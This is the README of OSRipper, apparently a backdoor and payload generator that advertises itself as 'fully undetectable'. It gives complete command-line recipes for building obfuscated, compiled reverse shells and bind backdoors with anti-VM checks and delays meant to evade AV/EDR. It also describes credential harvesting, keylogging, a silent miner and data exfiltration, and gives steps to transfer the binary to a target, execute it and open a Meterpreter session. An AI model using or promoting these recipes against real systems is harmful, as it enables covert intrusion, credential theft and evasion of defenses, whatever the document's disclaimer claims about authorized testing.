# OSRipper v0.3.2

<div align="center">

![OSRipper Logo](img/OSRipper.png)

[![CodeFactor](https://www.codefactor.io/repository/github/subglitch1/osripper/badge)](https://www.codefactor.io/repository/github/subglitch1/osripper/)
[![Python Version](https://img.shields.io/badge/python-3.6%2B-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey.svg)]()
[![Stars](https://img.shields.io/github/stars/SubGlitch1/OSRipper.svg?style=social&label=Stars)](https://github.com/SubGlitch1/OSRipper)

*Advanced cross-platform payload generator and crypter with FUD capabilities*

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Examples](#examples) • [Contributing](#contributing)

</div>

---

## Overview

OSRipper is a sophisticated, fully undetectable (FUD) backdoor generator and crypter that specializes in creating advanced payloads for penetration testing and red team operations. While originaly built with a focus on MacOS payloads, It is now universal. I neglected development for some time but as community attention is now increasing ill get back on it with new features and stable updates and would welcome contributions.

### Key Highlights

- **Fully Undetectable (FUD)** - Advanced evasion techniques bypass modern AV solutions
- **Multi-Layer Obfuscation** - Obfuscation engine with randomized variables and enhanced evasion
- **Command-Line Interface** - Full-featured CLI for automation and scripting
- **Staged Payloads** - Double-staged web delivery for enhanced stealth
- **Encrypted Communications** - SSL/TLS encrypted C2 communications
- **Rootkit Behavior** - Process masquerading and system integration
- **Modular Architecture** - Extensible plugin system for custom payloads

---

## Features

### Payload Generation
- **Bind Shell Backdoors** - Opens ports on victim machines for direct connection
- **Reverse TCP Meterpreter** - Encrypted reverse connections with SSL/TLS
- **Custom Code Crypter** - Obfuscate and encrypt any Python script
- **Silent BTC Miner** - Stealthy cryptocurrency mining capabilities
- **Staged Web Delivery** - Multi-stage payload delivery via HTTP

### Evasion Techniques
- **Advanced Obfuscation** - Multi-layer code obfuscation with random variables
- **Enhanced Obfuscation** - Anti-debug, VM detection, junk code injection, and advanced evasion (optional)
- **Anti-VM Detection** - Sandbox and virtual machine evasion
- **Stealth Delays** - Random startup delays to evade immediate execution monitoring
- **Process Masquerading** - Disguise as legitimate system processes
- **Persistence Mechanisms** - Automatic startup and system integration
- **Signature Randomization** - Every generated payload is unique

### Network Features
- **Ngrok Integration** - Automatic tunnel creation for easy access
- **C2 Server** - Built-in command and control server
- **Data Exfiltration** - Automated victim data collection and transmission
- **Multi-Protocol Support** - TCP, SSL, HTTP delivery methods

### Target Capabilities
- **System Information** - Complete hardware and software enumeration
- **Credential Harvesting** - Browser passwords, SSH keys, cloud credentials
- **File System Access** - Remote file upload/download capabilities
- **Keylogging** - Real-time keystroke capture
- **Screen Capture** - Remote desktop monitoring
- **Clipboard Access** - Clipboard content monitoring

---

## Detection Results

### Latest VirusTotal Scans
- **Python Payload**: [0/68 Detection Rate](https://www.virustotal.com/gui/file/e7e654893cec4e1f1aa76e2bbfa4bb1e0c6a15adf19236845948877e93013aea)
- **Compiled Binary**: [0/68 Detection Rate](https://www.virustotal.com/gui/file-analysis/MjM2MTJiMjI3YTMzM2JjYzExMTJhMzhiMGY4ODQxZjA6MTcwMTcyOTE3MQ==)

![VirusTotal Results](img/vt.png)

---

## Installation

### Prerequisites
- Python 3.6 or higher
- Metasploit Framework (for listeners)
- Git

### Quick Install

#### Linux (Ubuntu/Debian)
```bash
# Install dependencies
sudo apt update && sudo apt install git python3 python3-pip metasploit-framework -y

# Clone repository
git clone https://github.com/SubGlitch1/OSRipper.git
cd OSRipper

# Install into env
pip3 install -e .
```

#### macOS
```bash
# Install dependencies (requires Homebrew)
brew install python3 git

# Clone repository
git clone https://github.com/SubGlitch1/OSRipper.git
cd OSRipper

# Install into env
pip3 install -e .
```

#### Manual Installation
```bash
git clone https://github.com/SubGlitch1/OSRipper.git
cd OSRipper
pip3 install -r requirements.txt
```

---

## Usage

### Command-Line Interface (CLI)

OSRipper comes with a full-featured CLI that lets you generate payloads without the interactive menu. This is great for automation, scripting, or when you know exactly what you need.

**After installation via pip:**
```bash
osripper-cli <command> [options]
```

**Without installation (from source):**
```bash
python3 src/osripper/cli.py <command> [options]
# or
python3 -m osripper.cli <command> [options]
```

**Basic Examples:**

```bash
# Show help and available commands
osripper-cli --help

# Create bind backdoor on port 4444
osripper-cli bind -p 4444

# Create reverse shell with IP and port
osripper-cli reverse -H 192.168.1.100 -p 4444

# Use ngrok tunneling for reverse shell (dynamic IP/port)
osripper-cli reverse --ngrok -p 4444

# Encrypt and obfuscate a custom Python script
osripper-cli custom --script malware.py --obfuscate

# Create staged payload with web delivery
osripper-cli staged -H 192.168.1.100 -p 8080

# BTC miner (currently deprecated, standby for updates)
osripper-cli miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
```

**Advanced Examples:**

```bash
# Full featured reverse shell with obfuscation, enhanced evasion, compilation, and stealth delay
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --icon app.ico --delay

# Bind backdoor with obfuscation and custom output name
osripper-cli bind -p 4444 --obfuscate -o mybackdoor

# Quiet mode for scripting (minimal output)
osripper-cli reverse -H 192.168.1.100 -p 4444 --quiet

# Custom script with enhanced obfuscation and stealth delay
osripper-cli custom --script mypayload.py --obfuscate --enhanced --delay
```

**Available Commands:**

- `bind` - Create bind backdoor that opens a port on the victim machine
  - Required: `-p/--port` (1024-65535)
  - Example: `osripper-cli bind -p 4444`

- `reverse` - Create encrypted reverse TCP meterpreter with SSL/TLS encryption
  - Required: Either `-H/--host` (IP address) OR `--ngrok`, plus `-p/--port`
  - Example: `osripper-cli reverse -H 192.168.1.100 -p 4444`
  - Example: `osripper-cli reverse --ngrok -p 4444`

- `custom` - Obfuscate and encrypt existing Python scripts
  - Required: `--script` (path to .py file)
  - Example: `osripper-cli custom --script malware.py`

- `staged` - Create multi-stage web delivery payload with enhanced stealth
  - Required: Either `-H/--host` OR `--ngrok`, plus `-p/--port`
  - Example: `osripper-cli staged -H 192.168.1.100 -p 8080`

- `miner` - Create stealthy cryptocurrency mining payload (deprecated, standby for updates)
  - Required: `--address` (Bitcoin payout address, 26-35 characters)
  - Example: `osripper-cli miner --address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`

- `interactive` - Launch the interactive menu-driven interface
  - Example: `osripper-cli interactive`

**Common Options (available for most commands):**

- `--output, -o NAME` - Output filename (default: `payload`)
- `--obfuscate` - Obfuscate the generated payload using multi-layer encoding
- `--enhanced` - Use enhanced obfuscator with anti-debug, VM detection, junk code, and advanced evasion techniques (requires `--obfuscate`)
- `--compile` - Compile payload to standalone binary using Nuitka
- `--icon PATH` - Custom icon file (.ico) for compiled binary
- `--delay` - Add random delay (5-15 seconds) at startup for stealth. Useful for evading AV/EDR detection
- `--quiet, -q` - Quiet mode - minimal output (useful for scripting)
- `--config PATH` - Configuration file path (JSON format) for batch operations

**Getting Help:**

For detailed help on a specific command:
```bash
osripper-cli <command> -h
```

For example:
```bash
osripper-cli reverse -h
osripper-cli bind -h
```

### Interactive Mode

If you prefer a menu-driven interface, you can use interactive mode:

```bash
# Run from the repository root
python3 -m osripper

# Or if installed via pip
osripper

# Or via CLI command
osripper-cli interactive
```

### Available Modules (Interactive Mode)

| Module | Description | Use Case |
|--------|-------------|----------|
| **1** | Bind Backdoor | Direct connection to victim machine |
| **2** | Encrypted TCP Meterpreter | Reverse connection with encryption |
| **3** | Custom Code Crypter | Obfuscate existing Python scripts |
| **4** | Silent BTC Miner | Cryptocurrency mining payload |
| **5** | Staged Meterpreter | Web-delivered multi-stage payload |

### Example Workflow

**Using CLI (Recommended for automation):**
```bash
# Generate reverse shell with full features
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --delay

# Metasploit listener will start automatically
# Transfer the compiled binary from results/ directory to target
# Execute on target system
```

**Using Interactive Mode:**
```bash
# Launch interactive menu
osripper
# Select module 2 (Encrypted TCP Meterpreter - Recommended)
# Configure LHOST and LPORT
# Choose obfuscation and compilation options
```

**Deploy and Connect:**
1. Transfer generated binary from `results/` directory to target
2. Execute on target system
3. Payload connects back to your listener
4. Metasploit listener automatically starts (for reverse shells)
5. Use meterpreter commands:
   ```bash
   meterpreter > sysinfo
   meterpreter > shell
   ```

---

## Architecture

```
┌─────────────────┐
│   Generated     │
│    Binary       │
└─────────────────┘
         │
         │ Execute
         ▼
┌──────────────────┐
│ Obfuscated       │
│ Dropper          │
└──────────────────┘
         │
         │ HTTP GET
         ▼
┌─────────────────┐
│                 │
│   C2 SERVER     │
│                 │
└─────────────────┘
         │
         │ Download
         ▼
┌─────────────────┐
│   Meterpreter   │
│  Stage 1 Payload│
└─────────────────┘
         │
         │ Establish
         ▼
┌─────────────────┐
│   Encrypted     │
│   C2 Channel    │
└─────────────────┘
```

---

## Screenshots

### Main Interface
![Main Interface](img/screenshot.png)

### Payload Generation
![Example Generation](img/example.png)

### VirusTotal Results
![VirusTotal App Results](img/vt_app.png)

---

## Advanced Configuration

### Ngrok Integration
Enable automatic tunnel creation for easy remote access. This is useful when you don't have a static IP address.

**Via CLI:**
```bash
osripper-cli reverse --ngrok -p 4444
# Follow prompts to set up ngrok tunnel
```

**Via Interactive Mode:**
- Select "Use ngrok port forwarding" when prompted
- Run `ngrok tcp <port>` in another terminal
- Get free API key: https://dashboard.ngrok.com/api

### Custom Icons
Add custom icons to your payloads for better disguise.

**Via CLI:**
```bash
osripper-cli reverse -H 192.168.1.100 -p 4444 --compile --icon /path/to/icon.ico
```

**Via Interactive Mode:**
- When compiling, you'll be prompted for icon path
- Enter path to .ico file: `/path/to/icon.ico`

### Obfuscation Options
OSRipper offers multiple levels of obfuscation:

- **Standard Obfuscation** (`--obfuscate`): Multi-layer code encoding and variable randomization
- **Enhanced Obfuscation** (`--enhanced`): Adds anti-debug, VM detection, junk code injection, and advanced evasion techniques (requires `--obfuscate`)

**Via CLI:**
```bash
# Standard obfuscation
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate

# Enhanced obfuscation with all evasion techniques
osripper-cli reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced
```

### Stealth Delay
Add random startup delays (5-15 seconds) to evade AV/EDR detection that monitors immediate execution.

**Via CLI:**
```bash
osripper-cli reverse -H 192.168.1.100 -p 4444 --delay
```

### Compilation Options
- **Nuitka**: High-performance Python compiler (default, used with `--compile`)
- **PyInstaller**: Cross-platform executable creator (legacy support)
- **Custom obfuscation**: Multi-layer code protection with randomized variables

---

## Roadmap

### Completed (v0.3.1)
- [x] FUD payload generation (0/68 detection)
- [x] Multi-layer obfuscation engine
- [x] Staged web delivery system
- [x] C2 server implementation
- [x] Anti-VM detection
- [x] Process masquerading
- [x] Credential harvesting
- [x] Ngrok integration

### In Progress
- [ ] Enhanced post-exploitation modules
- [ ] Advanced persistence mechanisms
- [ ] Custom C2 protocol implementation
- [ ] Mobile platform support

### Future Plans
- [ ] AI-powered evasion techniques
- [ ] Blockchain-based C2 infrastructure
- [ ] Zero-day exploit integration
- [ ] Advanced social engineering payloads

---

## Contributing

We welcome contributions from the security research community!

### How to Contribute
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Guidelines
- Follow PEP 8 coding standards
- Add docstrings to all functions
- Test on multiple platforms
- Ensure FUD capabilities remain intact

---

## Documentation

- [Wiki](https://github.com/SubGlitch1/OSRipper/wiki) - Comprehensive documentation
- [Installation Guide](docs/installation.md) - Detailed setup instructions
- [Usage Examples](docs/examples.md) - Practical use cases
- [API Reference](docs/api.md) - Developer documentation

---

## Acknowledgments

Special thanks to the security research community and these projects:

- [htr-tech/PyObfuscate](https://github.com/htr-tech/PyObfuscate) - Obfuscation inspiration
- [cedowens/SwiftBelt](https://github.com/cedowens/SwiftBelt) - macOS enumeration
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework) - Payload handling

---

## Legal Disclaimer

**IMPORTANT**: This tool is developed for educational purposes and authorized penetration testing only.

- **Authorized Use**: Security research, penetration testing, red team exercises
- **Prohibited Use**: Unauthorized access, malicious activities, illegal purposes

**The developers are not responsible for misuse of this software. Users must comply with all applicable laws and regulations.**

---

## Support

- **Bug Reports**: [Open an Issue](https://github.com/SubGlitch1/OSRipper/issues)
- **Feature Requests**: [Discussions](https://github.com/SubGlitch1/OSRipper/discussions)
- **Security Issues**: Contact maintainers privately

---

## Statistics

<div align="center">

![GitHub stars](https://img.shields.io/github/stars/SubGlitch1/OSRipper?style=for-the-badge)
![GitHub forks](https://img.shields.io/github/forks/SubGlitch1/OSRipper?style=for-the-badge)
![GitHub issues](https://img.shields.io/github/issues/SubGlitch1/OSRipper?style=for-the-badge)
![GitHub last commit](https://img.shields.io/github/last-commit/SubGlitch1/OSRipper?style=for-the-badge)

</div>

---

<div align="center">

**Made by the OSRipper Team**

*Star this repository if you found it useful!*

</div>